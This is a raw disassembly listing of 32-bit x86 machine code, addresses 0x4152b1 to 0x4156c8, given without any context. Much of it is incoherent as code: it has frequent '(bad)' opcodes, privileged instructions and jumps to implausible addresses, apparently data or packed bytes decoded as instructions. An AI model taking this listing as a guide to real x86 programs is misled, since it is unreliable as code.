  4152b1:	add    BYTE PTR [ecx+0x4d84f0c7],cl
  4152b7:	dec    esp
  4152b8:	mov    DWORD PTR [edx],esi
  4152ba:	fmul   QWORD PTR [ebx-0x30cc03b3]
  4152c0:	add    esi,DWORD PTR [esi+0x3bd80389]
  4152c6:	test   DWORD PTR [edi],0x3d3800
  4152cc:	test   DWORD PTR [ebx+0x84dcf8],ecx
  4152d2:	add    edi,eax
  4152d4:	add    BYTE PTR [ebp+ecx*2-0x74cdccb4],al
  4152db:	mov    eax,DWORD PTR [ebx]
  4152dd:	cld    
  4152de:	mov    edi,ecx
  4152e0:	hlt    
  4152e1:	mov    dh,0x45
  4152e3:	add    esi,DWORD PTR [ebx]
  4152e5:	cmp    ecx,DWORD PTR [ebp+0x7218300f]
  4152eb:	add    BYTE PTR [eax],al
  4152ed:	mov    eax,DWORD PTR [ebp-0x20]
  4152f0:	mov    eax,DWORD PTR [eax]
  4152f2:	call   0x33c5a0be
  4152f7:	dec    esp
  4152f8:	add    esi,DWORD PTR [edx]
  4152fa:	cmp    ecx,DWORD PTR [ebx+0x98be475]
  415300:	cld    
  415301:	iret   
  415302:	(bad)  
  415303:	mov    ebx,es
  415305:	dec    esp
  415306:	push   0x32
  415308:	lea    esi,[edx]
  41530a:	mov    al,0x8b
  41530c:	call   0xff4b4e01
  415311:	iret   
  415312:	inc    ebp
  415313:	mov    WORD PTR [ebx-0x75cdccb4],cs
  415319:	or     al,BYTE PTR ds:0xe4728b
  41531f:	or     DWORD PTR [ebp-0x31],ecx
  415322:	xor    ecx,DWORD PTR [edi+ecx*1-0x34cd3fb0]
  415329:	cmp    al,cl
  41532b:	je     0x415505
  415331:	mov    eax,DWORD PTR [ebp-0x10]
  415334:	mov    eax,DWORD PTR [eax]
  415336:	xor    eax,edi
  415338:	mov    al,BYTE PTR [ebp+eax*1+0x32724c]
  41533f:	mov    ecx,DWORD PTR [ebp-0x20]
  415342:	xor    ecx,DWORD PTR [ecx]
  415344:	bswap  edi
  415346:	ror    BYTE PTR [ebx+ecx*8-0x7bcd3eb4],0x32
  41534e:	add    DWORD PTR [ebx+0x945dc00],ecx
  415354:	mov    ecx,edi
  415356:	xor    ecx,DWORD PTR [edx+ecx*4+0x7232054c]
  41535d:	or     al,BYTE PTR [eax]
  41535f:	mov    ecx,DWORD PTR [ebp-0x20]
  415362:	xor    ecx,DWORD PTR [ecx]
  415364:	bswap  edi
  415366:	ror    BYTE PTR [ebx+ecx*8-0x7bcd3eb0],0x3a
  41536e:	add    DWORD PTR [edi],ecx
  415370:	add    BYTE PTR [eax-0x7474ffbb],dl
  415376:	xor    ebx,esp
  415378:	mov    al,BYTE PTR [eax]
  41537a:	add    eax,0x8472c7
  41537f:	dec    esp
  415380:	dec    ebp
  415381:	xor    dh,BYTE PTR [ebx]
  415383:	mov    ecx,DWORD PTR [edi]
  415385:	lock ror BYTE PTR [ecx],0xcb
  415389:	iret   
  41538a:	ror    DWORD PTR [esp+eax*4+0x32014c],0x32
  415392:	inc    ebp
  415393:	mov    ecx,DWORD PTR [ebx-0x75f6cc1c]
  415399:	iret   
  41539a:	add    eax,0x4c728c
  41539f:	xor    cl,BYTE PTR [ebp+0xa]
  4153a2:	mov    ecx,DWORD PTR [ebx+0x98af033]
  4153a8:	or     eax,0x8c72cf
  4153ad:	push   eax
  4153ae:	shl    DWORD PTR [edx],0x4d
  4153b1:	cmp    cl,BYTE PTR [ebx-0x7574cc8b]
  4153b7:	fmul   QWORD PTR ds:0xc77200
  4153bd:	test   cl,al
  4153bf:	dec    esp
  4153c0:	dec    ebp
  4153c1:	xor    cl,BYTE PTR [ebx-0x751bcc75]
  4153c7:	or     DWORD PTR ds:0x8c72cf,ecx
  4153cd:	dec    esp
  4153ce:	enter  0x8532,0x32
  4153d2:	add    BYTE PTR [ebx+0x945e000],cl
  4153d8:	mov    ecx,edi
  4153da:	xor    ecx,DWORD PTR [edx+ecx*4+0x7232054c]
  4153e1:	or     al,BYTE PTR [eax]
  4153e3:	mov    ecx,DWORD PTR [ebp-0x24]
  4153e6:	mov    ecx,DWORD PTR [ecx]
  4153e8:	xor    ecx,edi
  4153ea:	mov    cl,BYTE PTR [ebp+ecx*1+0x327250]
  4153f1:	cmp    al,cl
  4153f3:	jne    0x415442
  4153f5:	lea    ecx,[ebx-0x7517cc50]
  4153fb:	sti    
  4153fc:	or     eax,0x4d72ff
  415401:	cmp    eax,ecx
  415403:	je     0x415452
  415405:	mov    ecx,DWORD PTR [ebx-0x7538cc04]
  41540b:	ret    
  41540c:	or     eax,0x8b7245
  415411:	call   0x84c71bde
  415416:	add    BYTE PTR [eax+eax*1-0x74ccbace],bl
  41541d:	mov    esi,DWORD PTR [ebx]
  41541f:	cld    
  415420:	mov    dl,BYTE PTR [ebp+0x5]
  415423:	xor    esi,DWORD PTR [edx+0x3]
  415426:	add    BYTE PTR [ebx],bh
  415428:	dec    ebp
  415429:	jnp    0x8b408826
  41542f:	mov    ecx,DWORD PTR ds:0x4d72fc
  415435:	xor    eax,ecx
  415437:	add    ecx,DWORD PTR [ebp+0x3b]
  41543a:	mov    esi,DWORD PTR [ebp+0x33]
  41543d:	mov    ecx,DWORD PTR [edx+0x724d0de8]
  415443:	xor    eax,DWORD PTR [eax]
  415445:	(bad)  
  415446:	ror    DWORD PTR [eax],0x4d
  415449:	jb     0x4153d6
  41544b:	add    BYTE PTR [ebx],dh
  41544d:	ja     0x4153d9
  41544f:	sbb    BYTE PTR ds:0x8d7275,cl
  415455:	cwde   
  415456:	enter  0x50e8,0xf3
  41545a:	inc    ebp
  41545b:	dec    DWORD PTR [ebx-0x7574ccbb]
  415461:	fadd   DWORD PTR ds:0xc372c7
  415467:	ror    DWORD PTR [ebp+0x13],0x8b
  41546b:	inc    ebp
  41546c:	xor    esi,DWORD PTR [ebx]
  41546e:	mov    al,BYTE PTR [ebx]
  415470:	or     eax,0x187250
  415475:	inc    ebp
  415476:	rcl    DWORD PTR [eax+0x4d],0xdc
  41547a:	mov    edi,edi
  41547c:	xor    ecx,DWORD PTR [ebx-0x3ff21376]
  415482:	jb     0x41540d
  415484:	add    ah,bl
  415486:	shl    DWORD PTR [ebp+0x4d],0xff
  41548a:	mov    ebx,esp
  41548c:	xor    eax,DWORD PTR [ebp-0x76]
  41548f:	add    ecx,DWORD PTR ds:0xe87208
  415495:	repz enter 0x10ff,0x45
  41549a:	inc    ebp
  41549b:	mov    edx,DWORD PTR [eax-0x28]
  41549e:	xor    bh,al
  4154a0:	inc    ebx
  4154a2:	mov    eax,ecx
  4154a4:	mov    eax,0xa00c111
  4154a9:	jne    0x4154f0
  4154ab:	mov    esi,DWORD PTR [ebx]
  4154ad:	test   al,0x3
  4154af:	inc    ebp
  4154b0:	mov    DWORD PTR [eax-0xc],edx
  4154b3:	mov    ds:0x8b33ff45,al
  4154b8:	lea    edx,[eax]
  4154ba:	xor    BYTE PTR [ebp+0x72],cl
  4154bd:	add    DWORD PTR [eax],eax
  4154bf:	mov    eax,edi
  4154c1:	lods   al,BYTE PTR ds:[esi]
  4154c2:	dec    ebp
  4154c3:	inc    ebp
  4154c4:	mov    ecx,DWORD PTR [ecx+0x45cf14f4]
  4154ca:	retf   
  4154cb:	mov    edx,ecx
  4154cd:	adc    al,0x84
  4154cf:	(bad)  
  4154d0:	std    
  4154d1:	ret    
  4154d2:	jmp    FWORD PTR [edi-0x37474bb]
  4154d8:	hlt    
  4154d9:	push   ebp
  4154da:	(bad)  
  4154db:	xor    eax,ebx
  4154dd:	(bad)  
  4154de:	enter  0x1111,0x72
  4154e2:	inc    ebp
  4154e3:	add    BYTE PTR [ebx-0x387deb3f],cl
  4154e9:	cld    
  4154ea:	test   bh,bh
  4154ec:	pushf  
  4154ed:	inc    ebp
  4154ee:	xor    bl,BYTE PTR [edi-0x15]
  4154f1:	pop    ebx
  4154f2:	push   0xffffffc2
  4154f4:	inc    DWORD PTR [eax]
  4154f6:	in     al,dx
  4154f7:	mov    eax,DWORD PTR [ebp+0x51]
  4154fa:	push   eax
  4154fb:	inc    ebp
  4154fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4154fd:	mov    edi,edi
  4154ff:	or     BYTE PTR [ebx+0x4d80fc16],cl
  415505:	add    DWORD PTR [ebx],esi
  415507:	add    BYTE PTR [ebx],al
  415509:	add    BYTE PTR [ebx],bh
  41550b:	icebp  
  41550c:	je     0x415516
  41550e:	mov    eax,DWORD PTR [edi]
  415510:	cld    
  415511:	rol    edi,0x72
  415514:	ret    
  415515:	add    BYTE PTR [edx-0x2f],ch
  415518:	lea    edx,[eax]
  41551a:	cwde   
  41551b:	jne    0x415505
  41551d:	(bad)  
  41551e:	clc    
  41551f:	or     al,0xff
  415521:	inc    DWORD PTR [ebp-0x18]
  415524:	cmp    ebx,0x18
  415527:	inc    DWORD PTR [ebp+0x6]
  41552a:	call   FWORD PTR [ebp-0x54]
  41552d:	or     al,0x75
  41552f:	push   ebp
  415530:	mov    ebp,esp
  415532:	test   al,0x53
  415534:	inc    ebp
  415535:	mov    edx,DWORD PTR [eax-0x75]
  415538:	imul   ecx,DWORD PTR [eax],0xffffffff
  41553b:	dec    ebp
  41553c:	mov    edx,DWORD PTR [edi-0x4]
  41553f:	push   ebp
  415540:	dec    ebp
  415541:	push   ecx
  415542:	xor    esi,DWORD PTR [ebx]
  415544:	add    edi,DWORD PTR [edi+0x74723b]
  41554a:	push   0xffffffc7
  41554c:	inc    DWORD PTR [ecx]
  41554e:	lods   al,BYTE PTR ds:[esi]
  41554f:	inc    ebp
  415550:	inc    ebp
  415551:	mov    eax,DWORD PTR [ebx]
  415553:	xchg   esp,eax
  415554:	or     BYTE PTR [eax],al
  415556:	call   0xffcd4de6
  41555b:	adc    al,0x45
  41555d:	or     BYTE PTR [ebx+0x800ac01],0x0
  415564:	inc    ebp
  415565:	inc    ecx
  415566:	add    ecx,DWORD PTR [ebx-0x76baebec]
  41556c:	mov    eax,DWORD PTR [ecx]
  41556e:	call   0x338aa273
  415573:	push   0x3
  415575:	push   0xc1300f
  41557a:	dec    ebp
  41557b:	jo     0x415508
  41557d:	push   0xffffffd4
  41557f:	dec    edi
  415581:	mov    DWORD PTR [ebx+ecx*4-0x3ccdf764],ecx
  415588:	cmp    eax,edi
  41558a:	cmovne edx,DWORD PTR [edi-0x75]
  41558e:	call   DWORD PTR [eax]
  415590:	mov    eax,DWORD PTR [ebp+0x8]
  415593:	call   FWORD PTR [esi+0x14]
  415596:	leave  
  415597:	inc    ebp
  415598:	adc    BYTE PTR [eax+0x55],dl
  41559b:	jne    0x415589
  41559d:	call   0xff52552d
  4155a2:	dec    ebp
  4155a3:	inc    ebp
  4155a4:	mov    ecx,DWORD PTR [ebx+0x390338b]
  4155aa:	add    BYTE PTR [ebx],bh
  4155ac:	mov    esi,DWORD PTR [ecx+eax*4-0x75]
  4155b0:	push   ebp
  4155b1:	or     al,0x51
  4155b3:	dec    ebp
  4155b4:	xor    DWORD PTR [ebx],0xf32039c
  4155ba:	cmp    eax,DWORD PTR [ebp+0x74]
  4155bd:	mov    edi,edi
  4155bf:	pop    edi
  4155c0:	adc    BYTE PTR [ebx+0x75],bl
  4155c3:	ret    0x50
  4155c6:	mov    ecx,DWORD PTR ss:[edx-0x7d]
  4155ca:	(bad)  
  4155cb:	clc    
  4155cc:	mov    esp,ebp
  4155ce:	pop    ecx
  4155cf:	mov    ecx,0xf80085c2
  4155d4:	mov    ecx,DWORD PTR [ecx+edx*2]
  4155d7:	push   esi
  4155d8:	push   esi
  4155d9:	(bad)  
  4155da:	lock inc DWORD PTR [ebp+0x44]
  4155de:	mov    edx,DWORD PTR [eax]
  4155e0:	adc    BYTE PTR [ebx+edi*4+0x8],bh
  4155e4:	or     BYTE PTR [ebp+0x7],dl
  4155e7:	push   ecx
  4155e8:	ret    
  4155e9:	xor    ebx,DWORD PTR [esi+edi*4+0x37232]
  4155f0:	mov    esi,edi
  4155f2:	mov    edi,DWORD PTR [esp+edx*1+0xc]
  4155f6:	cmp    BYTE PTR [ebp+0x1],0x89
  4155fa:	add    BYTE PTR [eax+ecx*1],ah
  4155fd:	cmp    DWORD PTR [ebp+0x10],eax
  415600:	mov    edx,DWORD PTR [esi]
  415602:	xchg   esp,eax
  415603:	dec    esp
  415604:	add    BYTE PTR [eax],dl
  415606:	mov    ecx,edx
  415608:	add    edx,DWORD PTR [esp+edi*1+0x8]
  41560c:	dec    ebp
  41560d:	into   
  41560e:	mov    ebp,DWORD PTR [edi+0x240089d8]
  415614:	mov    edx,DWORD PTR [eax+0x14]
  415617:	das    
  415618:	add    al,0x45
  41561a:	add    BYTE PTR [ebp+0x0],dh
  41561d:	mov    edi,edi
  41561f:	and    al,0x50
  415621:	mov    eax,DWORD PTR [eax]
  415623:	and    al,0xd1
  415625:	xor    eax,DWORD PTR [esi]
  415627:	lea    eax,[ebp+0x8]
  41562a:	xor    esi,DWORD PTR [edx+0x3]
  41562d:	add    BYTE PTR [ecx+0x4510fc44],cl
  415633:	xor    ecx,DWORD PTR [ebx+0x75eb0c9c]
  415639:	or     DWORD PTR [ebp-0x7a03f0],0x541608f8
  415643:	xor    bh,bh
  415645:	pushf  
  415646:	mov    edi,edi
  415648:	or     BYTE PTR [esi+ecx*1],cl
  41564b:	jne    0x415610
  41564d:	call   0xa5619
  415652:	adc    BYTE PTR [ebp+eax*2+0xc],al
  415656:	mov    ebx,DWORD PTR [eax]
  415658:	adc    BYTE PTR [ebx+eax*8+0x14],dh
  41565c:	mov    DWORD PTR [edi+ebp*4-0x73],0x750110fc
  415664:	pop    esi
  415665:	dec    ecx
  415667:	and    al,0x10
  415669:	call   DWORD PTR [ebp+0x24]
  41566c:	in     al,dx
  41566d:	call   0xffc55556
  415672:	adc    BYTE PTR [ecx+esi*1+0xc],al
  415676:	pushf  
  415677:	pop    esi
  415678:	mov    ebp,esp
  41567a:	and    al,0xc2
  41567c:	push   edi
  41567d:	add    BYTE PTR [ecx+0x33],al
  415680:	mov    DWORD PTR [ebp+0x24],esi
  415683:	test   DWORD PTR [ebx-0x45f7db8b],ecx
  415689:	dec    DWORD PTR [eax]
  41568b:	and    al,0x7
  41568d:	(bad)  
  41568e:	cli    
  41568f:	and    al,0x9c
  415691:	or     BYTE PTR [edx],dh
  415693:	sbb    BYTE PTR [ebx],al
  415695:	adc    al,0x89
  415697:	jmp    DWORD PTR [esp]
  41569a:	mov    ecx,DWORD PTR [ebx+0x1c7c0c0c]
  4156a0:	adc    al,0x8
  4156a2:	dec    ebp
  4156a3:	adc    BYTE PTR [ebp-0x7c],dh
  4156a6:	mov    esi,DWORD PTR [edx]
  4156a8:	and    al,0x24
  4156aa:	xor    eax,DWORD PTR [ebp-0x63dbf175]
  4156b0:	add    edi,eax
  4156b2:	pcmpeqb mm1,mm2
  4156b5:	jmp    0x415703
  4156b7:	dec    DWORD PTR [eax]
  4156b9:	je     0x4156a6
  4156bb:	mov    edi,DWORD PTR [ecx]
  4156bd:	pop    ebp
  4156be:	adc    BYTE PTR [esp+ecx*2-0x3e],al
  4156c2:	pushf  
  4156c3:	mov    DWORD PTR [eax-0x8],ebp
  4156c6:	jge    0x415730
  4156c8:	dec    DWORD PTR [ecx+0x5fbf7424]
